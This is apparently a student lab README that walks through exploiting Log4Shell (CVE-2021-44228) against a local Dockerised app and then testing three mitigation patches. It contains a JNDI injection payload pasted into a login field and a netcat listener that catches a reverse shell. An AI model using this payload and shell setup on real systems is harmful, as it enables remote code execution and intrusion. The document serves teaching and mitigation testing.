Log4j Vulnerability Demonstration (CVE-2021-44228)
This project demonstrates the exploitation of the Log4shell vulnerability CVE-2021-44228. This vulnerability allows remote code execution on the targeted application.
Prerequisites
Before performing the attack, make sure to download "jdk1.8.0_202" and place it in the "log4shell-group15" directory. The attack will only work if the "jdk1.8.0_202", is placed in the same directory.
Note: If any of commands do not work, please run them with root privileges by appending "sudo" at start of commmand.

To execute the exploit, follow these steps:
1. Open a terminal window and execute the command "docker build -t log4-shell-exploitable ." to create a Docker image of the vulnerable application.
2. Run the exploit application using the command "docker run --network host log4-shell-exploitable".
3. Open another terminal and run "Log4j_Exploit.py" using the command python3 Log4j_Exploit.py --ipaddr localhost --webServerport 8000 --port 9001.
4. Open another terminal and start netcat listening on the port specified when running "Log4j_Exploit.py" with the --port flag. The command should be as follows: nc -lvnp <port>.
5. Go back to the terminal where "Log4j_Exploit.py" is executing and copy the JNDI payload found after the string "To run the exploit, pass the script in the application:" (e.g., ${jndi:ldap://localhost:1389/a}).
6. Open a web browser and load the vulnerable application using the URL "http://localhost:8080/".
7. Paste the copied JNDI payload into the username field of the web application and click on the login page.
8. Check the terminal where you executed the netcat command to see if a new connection is received. If a connection is received, you can run the desired commands.

Mitigation Steps
After running each mitigation, please reset the application using the reset script, prior to running the next mitigation. To use the reset script, open a terminal and execute the command ./reset.sh. warning: ./reset.sh script contains the command to delete the unused docker images, please don't use the script if you have any other docker applications running on the system. 
To apply mitigation measures and test them, follow these steps:
Mitigation 1
1. Open a terminal window and execute the command ./mitigation1.sh to create a Docker image with the patch applied.
2. Run the exploit application using the command "docker run --network host log4-shell-mitigation1".
3. Open another terminal and run "Log4j_Exploit.py" using the command python3 Log4j_Exploit.py --ipaddr localhost --webServerport 8000 --port 9001.
4. Open another terminal and start netcat listening on the port specified when running "Log4j_Exploit.py" with the --port flag. The command should be as follows: nc -lvnp <port>.
5. Go back to the terminal where "Log4j_Exploit.py" is executing and copy the JNDI payload found after the string "To run the exploit, pass the script in the application:" (e.g., ${jndi:ldap://localhost:1389/a}).
6. Open a web browser and load the vulnerable application using the URL "http://localhost:8080/".
7. Paste the copied JNDI payload into the username field of the web application and click on login.
8. Check the terminal where you executed the netcat command to see if a new connection is received. You should not receive a connection.
9. The web browser should display the message "Entered password is incorrect. Please try again! <u>We will log your information</u>."
Mitigation 2
1. Open a terminal window and execute the command ./mitigation2.sh to create a Docker image with the patch applied.
2. Run the exploit application using the command "docker run --network host log4-shell-mitigation2".
3. Open another terminal and run "Log4j_Exploit.py" using the command python3 Log4j_Exploit.py --ipaddr localhost --webServerport 8000 --port 9001.
4. Open another terminal and start netcat listening on the port specified when running "Log4j_Exploit.py" with the --port flag. The command should be as follows: nc -lvnp <port>.
5. Go back to the terminal where "Log4j_Exploit.py" is executing and copy the JNDI payload found after the string "To run the exploit, pass the script in the application:" (e.g., ${jndi:ldap://localhost:1389/a}).
6. Open a web browser and load the vulnerable application using the URL "http://localhost:8080/".
7. Paste the copied JNDI payload into the username field of the web application and click on login.
8. Check the terminal where you executed the netcat command to see if a new connection is received. You should not receive a connection.
9. The web browser should display the message "Entered password is incorrect. Please try again! <u>We will log your information</u>."
Mitigation 3
1. Open a terminal window and execute the command ./mitigation3.sh to create a Docker image with the patch applied.
2. Run the exploit application using the command "docker run --network host log4-shell-mitigation3".
3. Open another terminal and run "Log4j_Exploit.py" using the command python3 Log4j_Exploit.py --ipaddr localhost --webServerport 8000 --port 9001.
4. Open another terminal and start netcat listening on the port specified when running "Log4j_Exploit.py" with the --port flag. The command should be as follows: nc -lvnp <port>.
5. Go back to the terminal where "Log4j_Exploit.py" is executing and copy the JNDI payload found after the string "To run the exploit, pass the script in the application:" (e.g., ${jndi:ldap://localhost:1389/a}).
6. Open a web browser and load the vulnerable application using the URL "http://localhost:8080/".
7. Paste the copied JNDI payload into the username field of the web application and click on login.
8. Check the terminal where you executed the netcat command to see if a new connection is received. You should not receive a connection.
9. The web browser should display the message "Entered password is incorrect. Please try again! <u>We will log your information</u>."
